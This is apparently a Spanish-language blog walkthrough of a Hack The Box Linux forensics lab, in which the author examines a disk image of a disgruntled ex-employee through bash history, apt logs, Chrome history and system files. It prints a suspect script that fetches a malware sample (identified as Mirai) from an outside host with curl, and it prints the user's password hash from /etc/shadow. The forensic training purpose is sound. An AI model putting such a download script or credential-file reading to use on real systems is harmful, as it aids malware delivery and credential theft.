---
layout: single
title: Sherlock - Linux_Forensics
excerpt: Ejercicio sencillo sobre análisis forense en sistemas operativos linux.
date: 2026-9-23
classes: wide
header:
   teaser: ../assets/images/socs/logoletsdefend.png
   teaser_home_page: true
   icon: ../assets/images/hacktheweb.webp
categories:
   - hackthebox
   - soc 
   - blue team
   - cloud
tags: 
   - linux
   - forensics
   - bash
   - grep 
   - ping 
   - bash_history
   - virus_total
   - hashing
---



**Scenario: An ex-employee, who appears to hold a grudge against their former boss, is displaying suspicious behavior. We seek assistance in uncovering their intentions or plans.**

Para este laboratorio se nos da un solo fichero:

Tenemos que montarlo en nuestro sistema.

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/linuxforensics]
└─$ file hackerman.img 
hackerman.img: DOS/MBR boot sector, extended partition table (last)
```

`hackerman.img` es una imagen raw de disco completo (no de una sola partición) — por eso el file/lsblk nos dice que tiene un MBR con tabla de particiones extendida. El kernel no puede montar directamente una imagen así porque no sabe dónde empieza cada partición dentro del archivo.

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/linuxforensics]
└─$ kpartx -av hackerman.img 
/dev/mapper/control: open failed: Permission denied
Failure to communicate with kernel device-mapper driver.
Incompatible libdevmapper 1.02.205 (2025-02-27) and kernel driver (unknown version).
device mapper prerequisites not met
```

`kpartx` lee la tabla de particiones de la imagen y crea device mapper nodes (/dev/mapper/loop0pX) para cada partición que encuentra, calculando automáticamente los offsets. Las flags:

-a → add (crea los mappings)
-v → verbose (para que veas qué particiones detectó)

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/linuxforensics]
└─$ lsblk -f 
NAME      FSTYPE  FSVER            LABEL          UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
loop0                                                                                                 
├─loop0p1                                                                                             
├─loop0p2 vfat    FAT32                           4E7A-CA0C                                           
└─loop0p3 ext4    1.0                             29153a2e-48a7-4e89-a844-dfa637a5d461    9.3G    46% /mnt/hackerman
sda                                                                                                   
└─sda1    ext4    1.0              root           98dc0284-e804-4aa4-8707-4578d41861b8   16.7G    81% /
sdb                                                                                                   
└─sdb1    ext4    1.0              root           59d0061c-70db-4e2d-b8ef-3b8209f07830                
sr0       iso9660 Joliet Extension VBox_GAs_7.2.6 2026-01-15-16-31-13-49                              
```

Lo que vemos en lsblk -f
- `loop0p1` → sin FSTYPE, probablemente la partición de boot/MBR reservada o algo no reconocido por blkid
- `loop0p2` → FAT32, típicamente EFI System Partition
- `loop0p3` → ext4, esta es la que te interesa — el filesystem raíz de Linux con el contenido real del sistema

Por eso hay que montar `loop0p3`: ahí está el sistema de archivos con la evidencia.

Y montamos con `mount -o ro,noload /dev/mapper/loop0p3 /mnt/hackerman`.

Con esto ya podemos avanzar con las preguntas.

--------

**1\. What is the MD5 hash of the image?**

Lo podemos saber con el siguiente comando: 

```bash
┌──(kali㉿kali)-[~/Documents/nueva_era_sherlocks/linuxforensics]
└─$ md5sum hackerman.img 
66871697481b4dfc14ef98ad8040b22d  hackerman.img
```

-----

**2\. What is the SHA256 hash of the file in the "hackerman" desktop?**

Con la imagen ya montada en nuestro sistema podemos explorar los archivos:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman/Desktop]
└─$ ls
hackerman.jpeg
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman/Desktop]
└─$ sha256sum hackerman.jpeg 
3c76e6c36c18ea881e3a681baa51822141c5bdbfef73c8f33c25ce62ea341246  hackerman.jpeg
```

------

**3\. What command did the user use to install Google Chrome?**

Para esto podemos buscar en el historial bash:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ cat .bash_history 
sudo apt update
touch superhackingscript.sh
cd ~
lks
ls
touch .secrets
nano .secrets 
sudo adduser mmox
sudo adduser xelessaway
sudo adduser mohamedhassn
ls
ls -lah
cat .bash_history 
sudo nano /etc/hosts
ping mmox.challenges 
sudo apt install gimp
sudo apt install vim
sudoa apt install chrome 
cd Downloads/
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg -i google-chrome-stable_current_amd64.deb
```

Primero se obtiene con `wget` y posteriormente se instala con `dpkg`.

------

**4\. When was the Gimp app installed?**

Esto lo podemos ver en las siguientes rutas:

```bash
- var/log/apt/dpkg.log
- var/log/apt/history.log
```

En este caso lo encontramos en: 

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ grep -i "gimp" ../../var/log/apt/history.log -B 2

Start-Date: 2023-05-06  10:49:42
Commandline: apt install gimp
Requested-By: hackerman (1000)
Install: libcodec2-1.0:amd64 (1.0.1-3, automatic),
<SNIP>
```

-----

**5\. What is the hidden secret that the attacker believes they have successfully concealed in a secret file?**

Revisando el `/home` vemos un fichero oculto:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ ls -al 
total 80
drwxr-x--- 15 kali kali 4096 May  6  2023 .
drwxr-xr-x  6 root root 4096 May  6  2023 ..
<SNIP>
-rw-r--r--  1 kali kali  807 May  6  2023 .profile
drwxr-xr-x  2 kali kali 4096 May  6  2023 Public
-rw-rw-r--  1 kali kali   87 May  6  2023 .secrets
<SNIP>
```

Al leerlo:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ cat .secrets                             
I think it's not that much of a hidden but here is my secert : I_want_to_hack_my_Boss 
```

--------

**6\. What was the UUID of the main root volume?**

El UUID  es el (Universally Unique Identifier), que es un identificador unico que el sistema operativo asigna a un sistema de archivos o particiòn, en este caso la raìz principal del sistema `/`

Podemos hacerlo de varias formas, como obtenerlo directamente sobre el dispositivo mapeado:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ sudo blkid /dev/mapper/loop0p3 
[sudo] password for kali: 
/dev/mapper/loop0p3: UUID="29153a2e-48a7-4e89-a844-dfa637a5d461" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="d0905327-b660-4469-bec3-1c7d555f0721"
```

leer el superblock ext4 directamente:

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ sudo dumpe2fs -h /dev/mapper/loop0p3 | grep -i uuid 
dumpe2fs 1.47.4 (6-Mar-2025)
Filesystem UUID:          29153a2e-48a7-4e89-a844-dfa637a5d461
```

O directamente desde el sistema ya montado:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ cat /mnt/hackerman/etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda3 during installation
UUID=29153a2e-48a7-4e89-a844-dfa637a5d461 /               ext4    errors=remount-ro 0       1
# /boot/efi was on /dev/sda2 during installation
UUID=4E7A-CA0C  /boot/efi       vfat    umask=0077      0       1
/swapfile                                 none            swap    sw              0       0
```

-----------

**7\. How many privileged commands did the user run?**

Para esto podemos filtrar con el siguiente comando:

```bash
┌──(kali㉿kali)-[/mnt/hackerman]
└─$ grep -e "hackerman:" -e "hackerman :" var/log/auth.log | wc -l
14
```

---------

**8\. What is the last thing the user searches for in the installed browser?**

Buscando en el history del navegador:

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ find .config -name "History" 2>/dev/null
.config/google-chrome/Default/History
```

Ahora identificado abrimos con `sqlite3`:

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ sqlite3 .config/google-chrome/Default/History                  

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
cluster_keywords          downloads                 segments                
cluster_visit_duplicates  downloads_slices          typed_url_sync_metadata 
clusters                  downloads_url_chains      urls                    
clusters_and_visits       keyword_search_terms      visit_source            
content_annotations       meta                      visits                  
context_annotations       segment_usage           
sqlite> select * from urls;
1|https://www.google.com/search?q=hackerman&oq=hackerman&aqs=chrome..69i57j0i512l9.1714j0j4&sourceid=chrome&ie=UTF-8|hackerman - بحث Google|2|0|13327855153321411|0
2|https://www.google.com/search?q=hackerman&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiSi6z77OD-AhWFhP0HHRqsDWsQ_AUoAXoECAEQAw&biw=1526&bih=732|hackerman - Google Search|2|0|13327855157019447|0
3|https://www.google.com/search?q=hackerman&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiSi6z77OD-AhWFhP0HHRqsDWsQ_AUoAXoECAEQAw&biw=1526&bih=732#imgrc=cFcd-jpE2QKP6M|hackerman - Google Search|1|0|13327855164666474|0
4|https://www.google.com/search?q=how+to+write+a+script+to+downlowad+malware+to+my+boss&&tbm=isch&ved=2ahUKEwihyMb87OD-AhUlvicCHVqAA-gQ2-cCegQIABAA&oq=how+to+write+a+script+to+downlowad+malware+to+my+boss&gs_lcp=CgNpbWcQAzoHCAAQigUQQzoFCAAQgAQ6CAgAEIAEELEDOgcIABAYEIAEOgYIABAIEB5QvAdYu_ABYNjxAWgmcAB4AIAB5AGIAcpRkgEGNi43OC4ymAEAoAEBqgELZ3dzLXdpei1pbWewAQDAAQE&sclient=img&ei=Ml1WZKHnFaX8nsEP2oCOwA4&bih=732&biw=1526|how to write a script to downlowad malware to my boss - Google Search|1|0|13327855225493429|0
5|https://www.google.com/search?q=how+to+write+a+script+to+downlowad+malware+to+my+boss&source=lmns&bih=732&biw=1526&hl=en-US&sa=X&ved=2ahUKEwiZlLSe7eD-AhVLoScCHeoLA8IQ_AUoAHoECAEQAA|how to write a script to downlowad malware to my boss - Google Search|2|0|13327855229563290|0
```

Viendo la última línea, el usuario busca `how to write a script to downlowad malware to my boss` 

-----

**9\. From Q8 we know that the user tried to write a script, what is the script name that the user wrote?**

Leyendo el historial de bash:

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ head .bash_history 
sudo apt update
touch superhackingscript.sh
<SNIP>
```

El nombre de `superhackingscript.sh` es bastante sugiriente.

----------

**10\. What is the URL that the user uses to download the malware?**

Buscando el script:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ sudo find /mnt/hackerman -name "superhackingscript.sh" 2>/dev/null
/mnt/hackerman/tmp/superhackingscript.sh
```

Y al leer su contenido:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ cat /mnt/hackerman/tmp/superhackingscript.sh
#!/bin/bash

# URL of the file to download
URL="https://mmox.me/supermalware"

# Destination path to save the downloaded file
DESTINATION="/tmp/ed6baf485cde6e94caa8326b91d323dbc53af58e954520ee55fed80b044c1985"

# Download the file using curl
curl -o "$DESTINATION" "$URL"
```

--------

**11\. What is the name of the malware that the user tried to download?**

En la pregunta anterior vimos que se descarta un fichero y se guarda en `/tmp/`, con lo que pareceser un hash. 

Si lo mandamos a VirusTotal veremos que está etiquetado como `mirai`, una familia de malware que convierte dispositivos linux(en su mayoría dispositivos IoT) en bots para realizar ataques DDoS masivos.

-------

**12\. What is the IP address associated with the domain that the user pinged?**

En el `.bash_history` vimos que se edita el `/etc/hosts` para añadir el dominio de `mmox.challenges` y posteriormente hacerle ping:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ cat .bash_history                         
sudo apt update
touch superhackingscript.sh
cd ~
lks
ls
touch .secrets
nano .secrets 
sudo adduser mmox
sudo adduser xelessaway
sudo adduser mohamedhassn
ls
ls -lah
cat .bash_history 
sudo nano /etc/hosts
ping mmox.challenges 
```

Leyendo este fichero:

```bash
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ cat ../../etc/hosts
127.0.0.1       localhost
127.0.1.1       HackerMan
mmox.challenges 185.199.111.153
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
```

-------------

**12\. What is the password hash of the "hackerman" user?**

Esto lo podemos ver en el `/etc/shadows`:

```bash
                                                                                                                                                                                            
┌──(kali㉿kali)-[/mnt/hackerman/home/hackerman]
└─$ sudo cat ../../etc/shadow | grep hackerman
hackerman:$y$j9T$71dGsUtM2UGuXod7Z2SME/$NvWYKVfU9fSpnbbQNbTXcxCdGz4skq.CvJUqRxyKGx6:19483:0:99999:7:::
```
